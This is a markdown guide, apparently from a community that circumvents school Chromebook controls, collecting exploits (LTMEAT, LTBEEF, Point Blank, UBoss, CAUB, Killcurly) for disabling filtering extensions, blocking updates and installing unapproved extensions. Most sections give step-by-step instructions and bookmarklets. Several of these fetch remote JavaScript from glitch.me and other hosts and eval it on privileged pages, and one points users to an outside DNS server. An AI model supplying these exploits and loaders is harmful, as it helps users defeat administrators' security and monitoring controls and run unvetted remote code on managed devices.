---
tags: bypasses
---
# Extension Bypasses

### Exploit Description
These are a collection of exploits you can use to bypass extensions. Credits to the people who created them, not us.

## Methods

### **LTMEAT** (Disable Extensions)
**L**iterally **T**he **M**eatiest **E**xploit of **A**ll **T**ime

From ltmeat.bypassi.com, if you are intrested in how this exploit works, check out that website.

1. Find a page belonging to the extension you want to disable. `chrome://extensions`, `chrome://extensions-internals`, and `chrome://process-internals` are all good places to find your extension's ID (a 32-character lowercase string). You can also just do a simple Google search. Once you have your ID, substitute it into the hostname in the URL below:
```
chrome-extension://extensionidhereblahblah/manifest.json
```

For some filters like Securly, the block screen is already an extension page.

2. Bookmark the extension page (bookmark A) if you wish. Then, bookmark `chrome://kill` (B) and `chrome://hang` (C).
3. While on the extension page (A), click the `chrome://kill` bookmark (B). The page should crash. You should already have the next step prepared.
4. Instantly start spamming `chrome://hang` (bookmark C) and quickly reload the page while spamming (ideally with the refresh key on your keyboard or `ctrl`+`R`). You should have reloaded within one or two seconds of killing the page.

If the extension page (bookmark A) no longer loads, then LTMEAT worked! You can close your tabs and the extension will basically be dead. If nothing loads, then you probably reloaded too late or spammed too slow. This isn't rocket science! Restart your computer to revert back to normal.

Exploit made by Bypassi#7037

#### FAQ:

**How do I get an extension ID?**

Extension IDs are leaked in a couple of places. Generally, the best way to get them is to go to extension settings and copy the URL query value.

**It says blocked by client?**

That's the message you get when you try to visit an a page belonging to an extension that doesn't exist. The error message (`ERR_BLOCKED_BY_CLIENT`) is extremely misleading. Nobody blocked it--you just need to find the right extension ID (see above).

If you got this because you tried to visit the `extension_id_here_please` example URL, you should be extremely ashamed of yourself. Please change and grow as a person. 

**I don't have a bookmarks bar!!!!**

First, try running ctrl+shift+B. If that doesn't work, go to `chrome://settings` and turn on the "home button" feature, then set it to `chrome://hang`. A home icon should show up to the right of your refresh icon in the top left. Use that instead of bookmark C.

**I disabled an extension but now I can't load websites!**

If you actually just read the writeup, you'd know that this would happen if the extension's background page loaded and its listeners were already initialized before you used `chrome://hang`. You can double-check whether the extension is listening using `chrome://extensions-internals`, assuming you have a few brain cells in your head.

Anyway, no listeners means you were too slow. Either you waited more than three seconds between bookmark B and reloading the page, or you weren't spamming bookmark C fast enough. The most reliable fix for this is to just restart your computer and try again. Try to match the pace of the gif below: (note the reload) 

![image](https://ltmeat.bypassi.com/img/abc.gif)

**The bookmarks don't do anything when I click them!**

Might be admin-blocked. Either be smart enough to figure out another way, or check this site daily to see if new alternate instructions have been posted.

**I disabled the extension, why is some stuff still blocked?**

I have bad news for you... not all filters are Chrome Extensions. And again, make sure the extension pages (like bookmark A) are frozen before you assume that your skiddy self successfully did the exploit. 

### **JPCMG** (LTBEEF with Service workers)
**Requirements**
- Access to `chrome://serviceworker-internals`
- Inspect element

1. Go to `chrome://serviceworker-internals`
2. Find your extension, this wont work if theres not a plugin in there.
3. Hit the start button then the `inspect` button, run basic LTBEEF code
```js
chrome.management.setEnabled('<plugin id here>',false)
```
4. Profit

![image](https://user-images.githubusercontent.com/58097612/234904781-4d5ad77e-6045-435e-8aae-df12dec53013.png)

Thanks to Nyaann#3881 for this exploit

### **Extension Launcher** (Install extensions w/o allowlist)
A bookmarklet capable of installing extensions, for those without a allowlist. 

Steps: 
Go to <a href="https://extension-installer.glitch.me/code.js">here</a> bookmark the code there (Might make a dns)
go to chrome.google.com/webstorex and use the bookmarklet, then put the icon of the extension, the id, and name of it (Doesn't matter just put anything)
press download, and it will work.

**Extra Notes**
- Credit to "Aka, but nice" on discord.
- Dns will be up soon, if bookmarklets are blocked
- This will not work if you have a blocklist this is only for if when you go to the webstore it shows blocked

### **New Point-Blank** (Scripts on extension pages)
This exploit allows you to run scripts, on extensions pages, this is a great example of how Chromebooks are a piece of garbage.

<i>Getting started</i>
(Note: if bookmarklets are blocked your screwed.)
1. Go to <a href="https://spot-maze-chinchilla.glitch.me/ingot.js">here</a> ([if blocked](https://raw.githubusercontent.com/3kh0/ext-remover/main/newpointblank.js)) on your school chromebook.
2. Make a bookmark with the code there.
3. Once that is done,

 If you have Securly go to <a href="https://tinyurl.com/bettergoofcurly">here</a> if it says blocked by chrome, reload (you have to actually have securly ofc)
 
 If you have iBoss go to <a href="https://tinyurl.com/goofboss">here</a>.
 
 If you have Cisco Umbrella go to <a href="https://tinyurl.com/goofumbrella">here</a>.
 
 If you have Blocksi go to <a href="https://tinyurl.com/goofsi">here</a>.
 
 And if you have GoGuardian(might not work) go to <a href="https://tinyurl.com/goofguardian">here</a>. 
 
 Now most of these links are a block page(this is intentional) on each page should have a blue link, click the link on the page if it opens a blank page click the bookmarklet that you just made and click either hard disable or soft disable, you can also run some of the scripts and run your own code, your extension may disable javascript being ran on it, so running your own code may not work.
 
**Extra notes**
- We recommend doing soft disable, which only disables it until restart. 
- The launcher was made by 3kh0, but the idea was from <a href="https://bolg.glitch.me/_/point-blank/">Bypassi#7037</a>
- If your school updated GoGuardian, this exploit may not work.

### **UBoss** (Tamper with IBoss)
By the BlueHatCrew
https://dsc.gg/blue-hat-crew

This works only for iBoss, and Blocksi, If you don't have one of these, use New Point Blank.

1. Go to https://tinyurl.com/byeswamp if you have iBoss or https://tinyurl.com/blockboss if you have Blocksi.
Then bookmark the code below
```js
javascript:opener.eval(`fetch("https://rounded-boiling-flax.glitch.me/uboss.js").then(data=>{data.text().then(e=>{eval(e)})})`) && close();
```
2. Then go to the site with your blocker that was listed above.
3. Run the code. Follow the instructions there.

If it doesnt work let us know by creating a discussion, this was made in partnership with Aka, but nice#5094 and Bypassi#7037.

### **CAUB** (Prevent Updates)
This exploit keeps your chromebook downgraded (or on the current version) without automatic updates screwing you over. This exploit was found by Catakang#0987. Using onc files, you can convince your chromebook that the wifi that you're connected to is pay-to-use (like a hotspot using data), and thus it will not check for updates.

![image](https://user-images.githubusercontent.com/58097612/212685932-ef9c802e-6040-42a3-be6e-10997162b7cd.png)

<i>Getting started</i>

1. Go to `chrome://network#state` (on your school chromebook of course; if this is blocked then ur kinda screwed lol).
2. Scroll to the bottom of the page; you should see a list of "favorite" wifis that you've connected to in the past.
3. Click the `+` sign next to the wifi name of each network that you commonly connect your chromebook to.
4. The more wifis you expand, the better, but note that they have to come from the "favorites" section.
5. Use ctrl+a and ctrl+c to copy all the text on the entire network#state page.
6. Go to [caub.glitch.me](https://caub.glitch.me/).
7. Paste the copied text into the textbox bshelow.
8. Press the `generate onc` button below the textbox.
9. Once you have downloaded the file, go to `chrome://network#general`.
10. Click on the `import onc` button.
11. Import the newly downloaded file.

**Extra notes**
- Your chromebook will no longer automatically update. (as long as you are on a wifi that you used caub on)
- Be careful not to stay on a wifi for too long without using caub on it, otherwise you might update.
- We cannot guarantee that this will work on every wifi

### **LTBEEF** (Disable extensions)
LTBEEF is an exploit, created by Bypassi#7037, which abuses api endpoints within the google chrome webstore. The original site created for this exploit can be found at <a href="https://ltbeef.netlify.app/">ltbeef.netlify.app</a>

<b>Please Note:</b> This exploit only works on versions below 106, and eariler versions of 102
  
**Installation**  
There are several vesions of this exploit you can use, here are the 2 most common versions:
- *Bookmarklets*  
    1. To use a GUI, bookmark one of the below scripts:  
    - Ingot  
    ```js
    javascript:(function () {var a = document.createElement('script');a.src = 'https://cdn.jsdelivr.net/gh/FogNetwork/Ingot/ingot.min.js';document.body.appendChild(a);}())
    ```
    - Compact Cow's UI  
    ```js
    javascript:fetch(`https://compactcow.com/ltbeef/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
    ```  
    - Compact Cow's UI (Dark)
    ```js
    javascript:void fetch(`https://raw.githubusercontent.com/3kh0/ext-remover/main/exploit.js`).then(d=>d.text()).then(eval);
    ```
    2. Navigate to <a href="https://chrome.google.com/webstorex">https://chrome.google.com/webstorex</a> and click on that bookmark. 
    3. Flip the switches on the extentions you want to disable. Simple!  

    Photos of the GUI's:
    ![image](https://user-images.githubusercontent.com/58097612/193318485-5267cd59-fb65-45a5-ad28-7f068bbce974.png)
    ![image](https://user-images.githubusercontent.com/58097612/190276894-fc492c5c-b0ce-4943-ae56-603f75634618.png)
   
- *DNS servers*  
    By changing your DNS server, you can use LTBEEF, even if bookmarklets are blocked.  
      
    1. First, go to Settings > Network > Wifi > Network.
    2. Click on `Custom Name Servers`
    
    ![image](https://user-images.githubusercontent.com/88395302/212482302-82334f42-c421-45c2-b210-1e700652b5be.png)  
    
    3. Set every box there to the following ip:
    ```
    158.101.114.159
    ```
    (Hosted by The Greatest Giant#0110)  
    4. Navigate to <a href="https://chrome.google.com/webstorex">https://chrome.google.com/webstorex</a> and click on that bookmark. 
    5. Flip the switches on the extentions you want to disable.
    6. Profit
    
### **LTBEEF inspect** (Using inspect to disable extensions)
![image](https://user-images.githubusercontent.com/58097612/207386423-e6aa2095-d92d-44a8-a3d6-e42066bdf34e.png)

The screenshot below was preformed on `108.0.5359.75` (Official Build) (64-bit) on the stable channel. This has been tested and does work but has varying levels of success, you will need access to inspect element, more specifically, console.

1. Open this on your chromebook: 
```
chrome-extension://gndmhdcefbhlchkhipcnnbkcmicncehk/manifest.json
``` 
Shortened link: https://tinyurl.com/i-ltbeef
2. Open inspect and navigate to the console tab.
3. Run the basic LTBEEF code such as
```js
chrome.management.setEnabled('extensionid', false)
```
Replacing `extensionid` with the ID of the extension you want to disable, e.g. the stuff after the = in the URL bar when you click the extension's "details" button in chrome://extensions

Credit to SprinkzMC#8421 (aka Bypassi) for finding this!

![image](https://user-images.githubusercontent.com/58097612/207385046-5a9f6f07-6089-4775-9183-c11bd24ba02c.png)

To re-enable just go to the chrome web listing for the extension and click on the banner.

### **Point Blank** (Run code on system pages)
Point Blank is an exploit that allows you to run bookmarklets on privilaged pages, sutch as the chrome extentions page. This exploit was also found by Bypassi, you can read more about how he discovered this exploit <a href="https://blog.bypassi.com/_/point-blank/"></a>

You can either use the prompt or the gui the prompt is below

1. Bookmark this code:

```js
javascript:let shim = false;var ids = prompt("extension ids (comma separated)").split(",");setInterval(()=>{ids.forEach((id)=> opener.chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: shim}));shim = !shim;}, 145);
```

And the gui is in launcher.js

2. Navigate to `chrome://extensions`.

3. Click on a extension that YOU installed from the Chrome Web Store > Details.

4. In the URL bar, copy the string of letters and numbers after the `/?id=`.

5. Click "View in Chrome Web Store" and spam the excape key. If it loads into chrome webstore try again, if it is a blank screen click the bookmarklet.

5. Paste the id of the extension into the prompt or input box seperated by commas.

If you close the tab, the exploit will stop working.

### **Killcurly** (Disable Extensions)
Kill extension, by signing out.

1. Visit `chrome://settings/signOut`, the O in Out must be capital.
2. Press the big blue button
3. Go to `chrome://restart`
4. Now visit `tinyurl.com/AddSession` or [this link](https://accounts.google.com/signin/v2/identifier?hl=en&continue=https%3A%2F%2Fwww.google.com%2F&ec=GAlAmgQ&flowName=GlifWebSignIn&flowEntry=AddSession)
5. Add your **SCHOOL** account back. It WILL NOT WORK if you add a home account back. This is just so you can still access Google Drive, Youtube, and any Google service.
6. All extensions should stop working.
7. Note that you have to repeat this every time you restart or sign out.
8. If the link gets patched and you no longer see the blue button, go to `chrome://settings/resetProfileSettings` click current settings, it'll open a blank page, on that page run 
```js
javascript:opener.chrome.send("TurnOffSync");
```
And visit `chrome://restart`.

**This was discoverered by zoroark**
## End Note
That's everything! If you need more help, you can reach out to us on your [Discord](https://discord.gg/elude) server or on [Reddit](https://reddit.com/r/sneakersneet). We will likely respond faster on Discord, however please still be patient.